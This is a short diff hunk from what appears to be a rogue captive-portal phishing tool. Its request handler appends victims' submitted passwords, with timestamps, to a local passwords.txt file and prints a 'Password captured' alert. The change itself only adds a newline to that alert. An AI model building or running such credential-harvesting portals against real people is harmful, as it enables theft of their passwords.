@@ -195,7 +195,7 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             with open('passwords.txt', 'a') as f:
                 f.write(f"{timestamp} - {password}\n")
             
-            print(f"[!] Password captured: {password}")
+            print(f"\n[!] Password captured: {password}")
             
             
             # Return a success page with JavaScript to close
